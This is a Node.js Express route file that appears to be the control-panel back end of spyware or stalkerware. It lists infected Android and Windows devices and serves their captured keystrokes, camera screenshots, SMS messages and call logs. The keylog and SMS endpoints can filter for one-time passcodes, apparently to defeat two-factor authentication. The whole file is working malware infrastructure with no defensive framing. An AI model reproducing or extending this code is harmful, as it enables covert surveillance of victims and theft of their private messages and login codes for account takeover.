const express = require('express');
const Device = require('../models/Device');
const Keylog = require('../models/Keylog');
const Screenshot = require('../models/Screenshot');
const SMS = require('../models/SMS');
const CallLog = require('../models/CallLog');
const { protect } = require('../middleware/auth');

const router = express.Router();

// @route   GET /api/devices
// @desc    Get all devices
// @access  Private
router.get('/', protect, async (req, res) => {
  try {
    const devices = await Device.find().sort({ lastSeen: -1 });
    res.json(devices);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// @route   GET /api/devices/online
// @desc    Get online devices only
// @access  Private
router.get('/online', protect, async (req, res) => {
  try {
    const devices = await Device.find({ isOnline: true }).sort({ lastSeen: -1 });
    res.json(devices);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// @route   GET /api/devices/:sessionId
// @desc    Get device by session ID
// @access  Private
router.get('/:sessionId', protect, async (req, res) => {
  try {
    const device = await Device.findOne({ sessionId: req.params.sessionId });
    if (!device) {
      return res.status(404).json({ message: 'Device not found' });
    }
    res.json(device);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// @route   DELETE /api/devices/:sessionId
// @desc    Delete device
// @access  Private
router.delete('/:sessionId', protect, async (req, res) => {
  try {
    await Device.findOneAndDelete({ sessionId: req.params.sessionId });
    await Keylog.deleteMany({ sessionId: req.params.sessionId });
    await Screenshot.deleteMany({ sessionId: req.params.sessionId });
    await SMS.deleteMany({ sessionId: req.params.sessionId });
    await CallLog.deleteMany({ sessionId: req.params.sessionId });
    res.json({ message: 'Device and all data deleted' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// @route   GET /api/devices/:sessionId/keylogs
// @desc    Get keylogs for device
// @access  Private
router.get('/:sessionId/keylogs', protect, async (req, res) => {
  try {
    const { limit = 1000, otpOnly = false } = req.query;
    const query = { sessionId: req.params.sessionId };
    if (otpOnly) query.isOtp = true;
    
    const keylogs = await Keylog.find(query)
      .sort({ timestamp: -1 })
      .limit(parseInt(limit));
    res.json(keylogs);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// @route   GET /api/devices/:sessionId/screenshots
// @desc    Get screenshots for device
// @access  Private
router.get('/:sessionId/screenshots', protect, async (req, res) => {
  try {
    const { limit = 100, camera } = req.query;
    const query = { sessionId: req.params.sessionId };
    if (camera) query.camera = camera;
    
    const screenshots = await Screenshot.find(query)
      .sort({ timestamp: -1 })
      .limit(parseInt(limit));
    res.json(screenshots);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// @route   GET /api/devices/:sessionId/sms
// @desc    Get SMS for device
// @access  Private
router.get('/:sessionId/sms', protect, async (req, res) => {
  try {
    const { limit = 1000, type, otpOnly = false } = req.query;
    const query = { sessionId: req.params.sessionId };
    if (type) query.type = type;
    if (otpOnly) query.isOtp = true;
    
    const smsList = await SMS.find(query)
      .sort({ timestamp: -1 })
      .limit(parseInt(limit));
    res.json(smsList);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// @route   GET /api/devices/:sessionId/calls
// @desc    Get call logs for device
// @access  Private
router.get('/:sessionId/calls', protect, async (req, res) => {
  try {
    const { limit = 1000, type } = req.query;
    const query = { sessionId: req.params.sessionId };
    if (type) query.callType = type;
    
    const callLogs = await CallLog.find(query)
      .sort({ timestamp: -1 })
      .limit(parseInt(limit));
    res.json(callLogs);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// @route   GET /api/devices/stats
// @desc    Get device statistics
// @access  Private
router.get('/stats', protect, async (req, res) => {
  try {
    const totalDevices = await Device.countDocuments();
    const onlineDevices = await Device.countDocuments({ isOnline: true });
    const androidDevices = await Device.countDocuments({ platform: 'android' });
    const windowsDevices = await Device.countDocuments({ platform: 'windows' });
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const todayDevices = await Device.countDocuments({ installedAt: { $gte: today } });
    
    res.json({
      totalDevices,
      onlineDevices,
      androidDevices,
      windowsDevices,
      todayDevices,
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

module.exports = router;